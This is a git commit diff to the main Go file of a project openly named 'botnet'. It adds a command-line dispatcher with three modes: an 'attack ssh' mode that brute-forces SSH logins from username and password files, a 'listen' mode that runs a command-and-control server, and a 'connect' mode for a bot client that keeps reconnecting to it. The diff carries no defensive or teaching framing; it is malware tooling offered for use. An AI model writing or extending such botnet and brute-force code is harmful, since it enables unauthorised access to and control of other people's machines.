318872b9b78e6235799cd662f0acc26f45a41436
rodzzlessa <rodzzlessa@gmail.com>
2016-11-07 09:23:09 -0500

    update botnet commands

--- cmd/botnet/main.go
+++ cmd/botnet/main.go
@@ -2,35 +2,58 @@ package main
 
 import (
 	"flag"
+	"fmt"
 	"time"
 
+	"gitlab.com/rodzzlessa24/botnet/attacks/ssh"
 	"gitlab.com/rodzzlessa24/botnet/client"
 	"gitlab.com/rodzzlessa24/botnet/server"
 )
 
 func main() {
-	listenPtr := flag.Bool("listen", false, "listen on [host]:[port] for incoming connections")
-	portPtr := flag.Int("port", 9999, "port to listen on")
-	targetPtr := flag.String("target", "", "target host")
 	reconPtr := flag.Int64("rt", 1, "Time to reconnect to cc")
-
+	targetPtr := flag.String("target", "", "target to connect to")
+	portPtr := flag.Int("port", 9999, "port to connect to")
+	usernameFilePtr := flag.String("ufile", "", "username file to use for brute force attack")
+	passFilePtr := flag.String("pfile", "", "password file to use for brute force attack")
 	flag.Parse()
+	args := flag.Args()
 
-	// Check if this is a client or a server
-	if !*listenPtr && *targetPtr != "" {
+	if args[0] != "attack" && args[0] != "listen" && args[0] != "connect" {
+		fmt.Println("[ERROR] command must be either attack, listen, or connect")
+		return
+	}
+
+	switch args[0] {
+	case "attack":
+		if len(args) < 2 {
+			fmt.Println("[ERROR] you must provide an attack type")
+			return
+		}
+		if args[1] == "ssh" {
+			if *usernameFilePtr == "" || *passFilePtr == "" {
+				fmt.Println("[ERROR] you must pass in a username and password file")
+				return
+			}
+
+			a := ssh.Attack{
+				UsernameFile: *usernameFilePtr,
+				PasswordFile: *passFilePtr,
+			}
+
+			a.Run()
+		}
+	case "listen":
+		s := &server.Server{
+			Port:   *portPtr,
+			Target: *targetPtr,
+		}
+		s.Run()
+	case "connect":
 		c := &client.Client{
 			Port:       *portPtr,
 			Target:     *targetPtr,
 			ReconnTime: time.Duration(*reconPtr),
-		}
-		c.Run()
-	}
-
-	// Okay it is a server
-	if *listenPtr {
-		c := &server.Server{
-			Port:   *portPtr,
-			Target: *targetPtr,
 		}
 		c.Run()
 	}
